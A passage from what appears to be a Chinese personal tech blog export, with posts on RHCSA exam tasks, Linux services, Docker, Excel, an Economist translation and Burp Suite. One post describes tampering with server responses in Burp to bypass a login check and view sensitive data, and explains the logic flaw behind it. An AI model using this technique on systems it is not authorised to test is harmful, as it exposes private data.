<li>使用工具authconfig-gtk进入配置界面<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imagea89f653aa9c27150.png" alt="imagea89f653aa9c27150.png"></li>
<li>验证：<code>id ldapuser1</code>如果能看到该用户，说明LDAP服务已挂载成功</li>
</ol>
<h2 id="配置NTP服务"><a href="#配置NTP服务" class="headerlink" title="配置NTP服务"></a>配置NTP服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">让其作为一个 rhgls.domain1.example.com 的 NTP 客户端</span><br></pre></td></tr></table></figure>
<ol>
<li>编辑配置文件/etc/chrony.conf<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image2c31dded0e264c27.png" alt="image2c31dded0e264c27.png"></li>
<li>重启chronyd并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl enable chronyd</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="配置autofs"><a href="#配置autofs" class="headerlink" title="配置autofs"></a>配置autofs</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">让用户可自动挂载由主机 host.domain1.example.com 提供的家目录： /home/guests/ldapuser1。</span><br><span class="line">解题方法：（最新考题nfs版本是3,具体的挂载目录看考题）</span><br></pre></td></tr></table></figure>
<ol>
<li>安装autofs<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install autofs</span><br></pre></td></tr></table></figure></li>
<li>配置autofs<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image19f7b76c2b7cc2d0.png" alt="image19f7b76c2b7cc2d0.png"></li>
</ol>
<ul>
<li>主配置文件/etc/auto.master<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image066f9a5d45880297.png" alt="image066f9a5d45880297.png"></li>
<li>编辑配置文件/etc/auto.guests<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image7231a44fe49f0d6e.png" alt="image7231a44fe49f0d6e.png"></li>
</ul>
<ol start="3">
<li>重启autofs并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart autofs</span><br><span class="line">systemctl enable autofs</span><br></pre></td></tr></table></figure></li>
<li>验证：<code>su - ldapuser1</code>可以直接登录，不提示“没有用户家目录”，就说明autofs成功。</li>
</ol>
<h2 id="配置一个用户账户"><a href="#配置一个用户账户" class="headerlink" title="配置一个用户账户"></a>配置一个用户账户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建一个UID为2000的用户，用户名称是jack。</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imageb2f337f345b3b924.png" alt="imageb2f337f345b3b924.png"></p>
<h2 id="添加一个swap分区"><a href="#添加一个swap分区" class="headerlink" title="添加一个swap分区"></a>添加一个swap分区</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建一个512M的SWAP分区，开机需要自动挂载</span><br></pre></td></tr></table></figure>
<ol>
<li>添加一块20G的硬盘<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image047774d561eacf8a.png" alt="image047774d561eacf8a.png"></li>
<li>创建512M的逻辑分区<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imagee60791cb1bc128df.png" alt="imagee60791cb1bc128df.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image6398915c46308c09.png" alt="image6398915c46308c09.png"></li>
<li>创建swap分区<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image8bcab1c017b294f7.png" alt="image8bcab1c017b294f7.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image2f96d0cb1daa2b45.png" alt="image2f96d0cb1daa2b45.png"></li>
</ol>
<h2 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找所有属于ronny用户的文件，并复制到/findfiles目录中。</span><br></pre></td></tr></table></figure>
<ol>
<li>创建ronny用户，准备一些文件<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image1725a8cab707a9ff.png" alt="image1725a8cab707a9ff.png"></li>
<li>创建/findfiles目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /findfiles</span><br></pre></td></tr></table></figure></li>
<li>find命令查找ronny用户的文件，并复制到/findfiles目录<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image83909d7438a7450d.png" alt="image83909d7438a7450d.png"></li>
</ol>
<h2 id="查找一个字符串"><a href="#查找一个字符串" class="headerlink" title="查找一个字符串"></a>查找一个字符串</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看/usr/share/dict/words文件中所有包含seismic关键词的行，并将找到的行写入到/root/filelist文件中。</span><br></pre></td></tr></table></figure>
<p>自己随便举了一个例子，方法就是这样：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image6b93118afb4ad556.png" alt="image6b93118afb4ad556.png"></p>
<h2 id="创建一个归档"><a href="#创建一个归档" class="headerlink" title="创建一个归档"></a>创建一个归档</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将/etc目录打包成压缩包后放置在/root/backup.tar.bz2.</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imagefa8438a74df6bfd0.png" alt="imagefa8438a74df6bfd0.png"></p>
<h2 id="创建一个逻辑卷"><a href="#创建一个逻辑卷" class="headerlink" title="创建一个逻辑卷"></a>创建一个逻辑卷</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建指定大小的逻辑卷，需要自己创建分区、物理卷、逻辑卷组和逻辑卷。</span><br><span class="line">创建一个名称为database的逻辑卷，卷组名称为datastore。</span><br><span class="line">逻辑卷大小为160M，PE大小为16M。</span><br><span class="line">要求开机后自动挂载到/mnt/database目录中。</span><br></pre></td></tr></table></figure>
<p>创建逻辑卷，并设置开机自动挂载<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image6e6685c090bcafc0.png" alt="image6e6685c090bcafc0.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image7efc95cf539dcd13.png" alt="image7efc95cf539dcd13.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image4fd41ecb803e478b.png" alt="image4fd41ecb803e478b.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image8d7e1fcef77fc298.png" alt="image8d7e1fcef77fc298.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image0463563e4587cf22.png" alt="image0463563e4587cf22.png"></p>
<h2 id="最后，重启机器，检查题目"><a href="#最后，重启机器，检查题目" class="headerlink" title="最后，重启机器，检查题目"></a>最后，重启机器，检查题目</h2>]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>RHCSA练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Rivian-电动皮卡先行者</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-87day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-87天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Charging up: Rivian’s IPO</p>
<p>蓄电：Rivian上市</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/michael-fousert-O63S96_qn8c-unsplash.jpg" alt="michael-fousert-O63S96_qn8c-unsplash.jpg"></p>
<p>When Rivian, an electric-truck manufacturer, lists in New York on Wednesday, it will seek a valuation of around $67bn, not far below the market capitalisation of Ford (an investor) and above Honda’s. That would be an impressive feat for an unprofitable 12-year-old startup that made its first deliveries in September and lost nearly $1bn in the first half of the year.</p>
<p>周三，电动汽车制造商Rivian在纽约上市，将寻求大约670亿美元的估值。其估值略低于福特（投资方）的市值，比本田的市值高。这家12岁的初创公司，9月才交付第一批产品，并且前半年就损失了将近10亿美元。上市对这家尚未盈利的公司而言，简直是振奋人心的壮举。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/1200px-Rivian_company_logo.jpg" alt="1200px-Rivian_company_logo.jpg"></p>
<p>But investors are hungry for firms that can challenge old carmakers in the electrification race—as Tesla’s stockmarket value, now over $1trn, attests.</p>
<p>如今，特斯拉股票市值实际已经超过1万亿美元，所以投资方急切寻找能够撼动旧有电动汽车市场的新秀公司。</p>
<p>Beset by manufacturing delays, Rivian says it will dispatch around 1,000 pick-up trucks by the end of the year.</p>
<p>受到生产延期的困扰，Rivian声称将在年底前交付大约1000辆皮卡。</p>
<p>Competition looms from Ford itself, which will soon start producing an electric version of the F-150 pick-up truck, America’s best-selling vehicle, and from GM and Tesla.</p>
<p>来自福特自身的竞争也迫在眉睫，福特很快会开始生产美国最畅销汽车F-150皮卡的电动版。通用汽车和特斯拉也不甘落后。</p>
<p>（图源：汽车经）</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/Rivian.png" alt="Rivian.png"></p>
<p>Meanwhile, Rivian is working on electric delivery vans:</p>
<p>同时，Rivian还致力于电动面包车的交付。</p>
<p>Amazon, another investor, has ordered 100,000.</p>
<p>另一个投资方亚马逊已经订购了10万辆电动面包车。</p>
<p>All that ought to keep the firm’s batteries charged.</p>
<p>所有这些都应该能为Rivian公司“蓄电”。</p>
<p>这家初创公司也是够特别了，12岁也还是初创……电动皮卡将来也许会成为流行。</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>The InfoSec Handbook翻译（介绍）</title>
    <url>//posts/ZH-CN/The_InfoSec_Handbook_Intro.html</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwg40lfnaj30oy0pitcg.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwg4zibn2j30ky0p2gry.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwg5erdjsj30l20p6n4q.jpg" alt="image.png"></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本书用通俗的语言解释信息安全的概念。目标读者是初学者。同时，为了让内容吸引信息安全领域的人群，我们也详细描述了其中一些概念。</p>
]]></content>
      <categories>
        <category>翻译</category>
      </categories>
      <tags>
        <tag>The InfoSec Handbook</tag>
        <tag>翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>The InfoSec Handbook翻译（目录）</title>
    <url>//posts/ZH-CN/The_InfoSec_Handbook_Content.html</url>
    <content><![CDATA[<h2 id="Contents-at-a-Glance"><a href="#Contents-at-a-Glance" class="headerlink" title="Contents at a Glance"></a>Contents at a Glance</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwfngq4duj30l70ohjuf.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwfnv9ro8j30l50pcta6.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="目录总览"><a href="#目录总览" class="headerlink" title="目录总览"></a>目录总览</h2><ul>
<li>关于作者</li>
<li>致谢</li>
<li>介绍</li>
<li>第一部分：介绍<ul>
<li>第1章：安全介绍</li>
<li>第2章：计算机安全的历史</li>
</ul>
</li>
<li>第二部分：关键准则和实践<ul>
<li>第3章：关键的概念和准则</li>
<li>第4章：访问控制</li>
<li>第5章：信息系统管理</li>
</ul>
</li>
<li>第三部分：应用安全<ul>
<li>第6章：应用和web安全</li>
<li>第7章：恶意软件和防病毒软件</li>
<li>第8章：密码学</li>
</ul>
</li>
<li>第四部分：网络安全<ul>
<li>第9章：了解网络和网络安全</li>
<li>第10章：防火墙</li>
<li>第11章：入侵检测和入侵防御系统</li>
<li>第12章：虚拟专用网络</li>
<li>第13章：数据备份和云计算</li>
</ul>
</li>
<li>第五部分：物理安全<ul>
<li>第14章：物理安全和生物识别</li>
<li>第15章：社会工程学</li>
<li>第16章：信息安全的当前趋势</li>
</ul>
</li>
<li>参考文献</li>
<li>索引</li>
</ul>
]]></content>
      <categories>
        <category>翻译</category>
      </categories>
      <tags>
        <tag>The InfoSec Handbook</tag>
        <tag>翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>Tips之win10设置java多版本共存如何快速切换java版本</title>
    <url>//posts/ZH-CN/Tips_Win10_Java_Switch_Version.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>电脑本地的burpsuite只能用<code>java version &quot;1.8.0_191&quot;</code>这个版本的java，而最近学习java编程又是用java13。他俩可以和平共处就好了。于是在网上搜罗到了一个方法，能帮助我们快速切换java版本，设置超简单。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>首先确保电脑上已经安装好这两个版本的java，记住安装位置。在环境变量上面做个手笔就行了。<br>像这样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc3xrrw9m3j30m20ll75a.jpg" alt="image.png"><br>原理就是更改<code>JAVA_HOME</code>来切换java目录，快速切换java版本。<br>命令行输入<code>java -version</code>查看版本切换是否成功。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc3xtxlanzj30y30ofq3y.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/anthony_ju/article/details/80445728">https://blog.csdn.net/anthony_ju/article/details/80445728</a></p>
]]></content>
      <categories>
        <category>java学习</category>
        <category>Tips</category>
      </categories>
      <tags>
        <tag>快速切换java版本</tag>
        <tag>win10设置java多版本共存</tag>
      </tags>
  </entry>
  <entry>
    <title>VScode创建工作空间</title>
    <url>//posts/ZH-CN/VScode-workspace.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我需要编辑多个文件夹里面的文件，每次只能打开一个文件夹，这样很不方便。于是，我们需要创建一个工作空间，把需要编辑的不同文件夹放到一个工作空间，就可以直接切换文件夹。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么创建工作空间？"><a href="#怎么创建工作空间？" class="headerlink" title="怎么创建工作空间？"></a>怎么创建工作空间？</h2><p>点击【File】——&gt;【Save Workspace As……】，就把当前文件夹保存为了工作空间的格式，下次使用的时候，直接打开这个工作空间即可。<br><a href="https://v2ray.dana5haw.com:8008/image/gUud"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imageb51497feebcd6fd3.png" alt="imageb51497feebcd6fd3.png"></a><br>如果需要添加新的文件夹到现有的工作空间，就这样操作：<br><a href="https://v2ray.dana5haw.com:8008/image/gEjc"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image1f24353758cd8299.png" alt="image1f24353758cd8299.png"></a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考<a href="https://blog.csdn.net/WinstonLau/article/details/89246874">这篇文章</a></p>
]]></content>
      <categories>
        <category>VScode</category>
      </categories>
      <tags>
        <tag>VScode</tag>
        <tag>工作空间</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox安装</title>
    <url>//posts/ZH-CN/VirtualBox_Installation.html</url>
    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.virtualbox.org/wiki/Downloads">点这里下载</a>。龟速下载中……</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p><del>待续</del><br>最后是用迅雷下载的，安装过程参考<a href="https://segmentfault.com/a/1190000016082055">这篇文章</a>，安装完成是这样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1i33jnt4j30pn0g3di2.jpg" alt="image.png"></p>
<h2 id="导入ova镜像"><a href="#导入ova镜像" class="headerlink" title="导入ova镜像"></a>导入ova镜像</h2><p><a href="https://www.cnblogs.com/lixy-88428977/p/9563118.html">参考文章</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1i9do3f7j30zd0g30tt.jpg" alt="image.png"><br>切换到专家模式进行配置，更改默认的虚拟机安装位置。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1idbdrvdj30qd0imta5.jpg" alt="image.png"><br>安装完成后，是酱紫的，比vmware更清爽的赶脚……不好意思哈，见异思迁了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1ikuq222j30pn0g3q4g.jpg" alt="image.png"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他的基本用法逐步熟悉。</p>
]]></content>
      <categories>
        <category>安装教程</category>
      </categories>
      <tags>
        <tag>安装VirtualBox</tag>
        <tag>安装教程</tag>
      </tags>
  </entry>
  <entry>
    <title>autofs自动挂载服务</title>
    <url>//posts/ZH-CN/redhat7-autofs.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>重启机器使用yum之前，都得挂载一下yum仓库，实在很费时间。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="autofs自动挂载服务设置"><a href="#autofs自动挂载服务设置" class="headerlink" title="autofs自动挂载服务设置"></a>autofs自动挂载服务设置</h2><ol>
<li>安装autofs软件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install autofs</span><br></pre></td></tr></table></figure></li>
<li>编辑autofs主配置文件<code>/etc/auto.master</code><br>增加这一句：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/media /etc/iso.misc</span><br></pre></td></tr></table></figure></li>
<li>编辑配置文件<code>/etc/iso.misc</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iso -fstype=iso9660 :/dev/cdrom</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>解析：linux系统中，<code>iso</code>指的是挂载点：<code>/media/iso</code>。<br><code>-fstype=iso9660</code>指的是文件类型。<br><code>:/dev/cdrom</code>指的是设备名称。</p>
          </div></li>
<li>重启autofs服务生效<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart autofs</span><br></pre></td></tr></table></figure>
<h2 id="实验现象"><a href="#实验现象" class="headerlink" title="实验现象"></a>实验现象</h2>进入到iso目录时，自动挂载设备到iso目录。目的是在需要挂载的时候去挂载设备，节省服务器的带宽资源。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/03/image.png" alt="image.png"></li>
</ol>
<h2 id="补充-开机自动挂载镜像"><a href="#补充-开机自动挂载镜像" class="headerlink" title="补充-开机自动挂载镜像"></a>补充-开机自动挂载镜像</h2><p>以上设置完成之后，还需要做一步操作，才可以实现镜像自动挂载。<br>那就是修改yum仓库配置文件<code>/etc/yum.repo.d/rhel7.repo</code>，把本机的挂载点改为/media/iso。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[rhel7]</span><br><span class="line">name=rhel7</span><br><span class="line">baseurl=file:///media/iso</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>autofs</tag>
        <tag>自动挂载</tag>
      </tags>
  </entry>
  <entry>
    <title>burp抓取https流量</title>
    <url>//posts/ZH-CN/burp-https-setting.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>使用burp代理后，https的请求会显示不安全。<br><a href="https://v2ray.dana5haw.com:8008/image/x9hG"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageeeb2e4899772a699.png" alt="imageeeb2e4899772a699.png"></a></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>下载burp的证书，并导入到浏览器，就可以使用burp抓取https流量了。<br><a href="https://v2ray.dana5haw.com:8008/image/xDYH"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image249eaa2185f48c9a.png" alt="image249eaa2185f48c9a.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xQmS"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image975974e6e6e09d44.png" alt="image975974e6e6e09d44.png"></a><br>现在可以抓取https流量了：<br><a href="https://v2ray.dana5haw.com:8008/image/xHWf"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb7a4d174cb863096.png" alt="imageb7a4d174cb863096.png"></a></p>
]]></content>
      <categories>
        <category>burp</category>
      </categories>
      <tags>
        <tag>burp</tag>
        <tag>抓取https流量</tag>
      </tags>
  </entry>
  <entry>
    <title>burp拦截服务器返回的数据包并改包</title>
    <url>//posts/ZH-CN/burp-intercept-server-package.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>遇到某系统的一个逻辑漏洞，修改服务器返回的数据包就能够查看到原本登录之后才看得到的信息。但是怎么修改服务器返回的数据包呢？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="burp设置拦截服务器返回的数据包"><a href="#burp设置拦截服务器返回的数据包" class="headerlink" title="burp设置拦截服务器返回的数据包"></a>burp设置拦截服务器返回的数据包</h2><p>设置方法：proxy——&gt;options——&gt;Intercept Server Responses，勾选“Intercept responses based on the following rules:”<br>设置规则，当拦截请求时，同时拦截响应。<br><a href="https://v2ray.dana5haw.com:8008/image/1m8U"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image3981ef74c15717c6.png" alt="image3981ef74c15717c6.png"></a></p>
<h2 id="拦截服务器返回的数据包并改包"><a href="#拦截服务器返回的数据包并改包" class="headerlink" title="拦截服务器返回的数据包并改包"></a>拦截服务器返回的数据包并改包</h2><p>随意填写登录信息，拦截登录请求，点击forward。<br><a href="https://v2ray.dana5haw.com:8008/image/1Br8"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image212188acf5cf7206.png" alt="image212188acf5cf7206.png"></a><br>拦截到服务器返回的数据包，并改包，点击“intercept off”：<br><a href="https://v2ray.dana5haw.com:8008/image/1dxZ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image268b9449dc5fcd3b.png" alt="image268b9449dc5fcd3b.png"></a><br>这是漏洞修复之后的页面显示。在漏洞修复之前，修改服务器返回的数据包之后，可以看到系统的敏感信息。<br><a href="https://v2ray.dana5haw.com:8008/image/15Gi"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image2b36b46418166354.png" alt="image2b36b46418166354.png"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞属于业务逻辑漏洞，前端js显示的逻辑设置不严谨，因此攻击者修改服务器返回的数据包就能够查看到系统的敏感信息。</p>
<blockquote>
<p>他逻辑是这样的，当你访问这个域名，前端js就已经有这些信息，只是不登陆看不到。这部分信息，他检测是否登录，就只是依据服务端返回的error的值。<br>正常业务逻辑应该是，验证了登录，服务端才发送这些信息到前端。</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>burp设置参考<a href="https://www.jianshu.com/p/7e94a79abe95">这篇文章</a></p>
]]></content>
      <categories>
        <category>burp</category>
      </categories>
      <tags>
        <tag>burp</tag>
        <tag>拦截服务器返回的数据包</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令之终止容器、删除容器</title>
    <url>//posts/ZH-CN/docker-stop-delete-container.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>docker虽然使用方便，但是着实很吃内存。我需要把不用的容器终止并删除掉。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="查看当前的所有容器"><a href="#查看当前的所有容器" class="headerlink" title="查看当前的所有容器"></a>查看当前的所有容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# docker container ls -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                  PORTS               NAMES</span><br><span class="line">2998630075a3        p3terx/aria2-pro    &quot;/init&quot;             4 days ago          Up 4 days                                   aria2-gdrive</span><br><span class="line">29d3c2798668        p3terx/aria2-pro    &quot;/init&quot;             5 days ago          Up 4 days                                   aria2-onedrive</span><br><span class="line">5f85e8e476e5        p3terx/aria2-pro    &quot;/init&quot;             5 days ago          Up 5 days                                   aria2-pro</span><br><span class="line">27e3d8fb6f9f        hello-world         &quot;/hello&quot;            5 days ago          Exited (0) 5 days ago                       lucid_shannon</span><br></pre></td></tr></table></figure>
<h2 id="终止某个容器"><a href="#终止某个容器" class="headerlink" title="终止某个容器"></a>终止某个容器</h2><p>语法：<code>docker stop [容器id]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# docker stop 5f85e8e476e5</span><br></pre></td></tr></table></figure>
<h2 id="删除某个容器"><a href="#删除某个容器" class="headerlink" title="删除某个容器"></a>删除某个容器</h2><p>语法：<code>docker container rm [容器名称]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~#  docker container rm aria2-pro</span><br></pre></td></tr></table></figure>
<p>如果需要删除所有终止的容器，可以直接使用命令<code>docker container prune</code>。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>主要参考<a href="https://yeasy.gitbooks.io/docker_practice/container/rm.html">这篇docker文档</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>删除容器</tag>
        <tag>终止容器</tag>
      </tags>
  </entry>
  <entry>
    <title>dynadot买的域名怎么增加二级域名</title>
    <url>//posts/ZH-CN/Dynadot_Add_SubDomain.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>v2ray使用WS+TLS这种方式更加确保梯子的安全性，但是需要我们手里面有域名可用。年初在dynadot买了一个域名，主域名绑定了博客，还有二级域名可以使用。怎么添加二级域名，操作方法是什么？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>登录dynadot官网，进去设置域名解析即可：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcy0owdiumj31f60p4di0.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcy0mx7i41j31f60u00w2.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.dynadot.com/zh/community/help/question.html?aid=25">官方说法：最多可设置50个二级域名~</a></p>
]]></content>
      <categories>
        <category>dynadot</category>
      </categories>
      <tags>
        <tag>dynadot</tag>
        <tag>增加二级域名</tag>
      </tags>
  </entry>
  <entry>
    <title>excel之如果单元格包含特定文本则返回指定值</title>
    <url>//posts/ZH-CN/excel-if-isnumber-search.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我需要做一个条件判断，如果一个单元格包含特定的文本，就返回指定值。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=IF(ISNUMBER(SEARCH(&quot;特定文本&quot;,B1)),&quot;指定值1&quot;,&quot;指定值2&quot;)</span><br></pre></td></tr></table></figure>
<p>这个函数的意思是，如果在B1单元格找到<code>特定文本</code>这串字符，目标单元格返回<code>指定值1</code>，否则返回<code>指定值2</code>。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考<a href="https://www.51wikihow.com/excel/in-excel-returns-the-specified-value-if-the-cell-contains-specific-text.html">这篇教程</a></p>
]]></content>
      <categories>
        <category>excel</category>
      </categories>
      <tags>
        <tag>excel</tag>
        <tag>SEARCH函数</tag>
      </tags>
  </entry>
  <entry>
    <title>excel之合并计算多个csv源数据</title>
    <url>//posts/ZH-CN/excel-csv-data.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在有一个需求，将导出的多个csv数据源进行合并分析。直接使用csv源数据，不必把csv转换为excel。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="excel添加【数据透视表和​​数据透视图向导】"><a href="#excel添加【数据透视表和​​数据透视图向导】" class="headerlink" title="excel添加【数据透视表和​​数据透视图向导】"></a>excel添加【数据透视表和​​数据透视图向导】</h3><p>需要使用到<code>数据透视表和​​数据透视图向导</code>里面的<code>多重合并计算数据区域</code>这个模块，excel默认没有添加<code>数据透视表和​​数据透视图向导</code>。<br>于是我们进入【选项】，添加一下这个模块（操作方法<a href="http://club.excelhome.net/thread-1340693-1-1.html">参考</a>）：</p>
<ul>
<li>新建选项卡、组<br><a href="https://v2ray.dana5haw.com:8008/image/g8XL"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image3255388a6fa60750.png" alt="image3255388a6fa60750.png"></a></li>
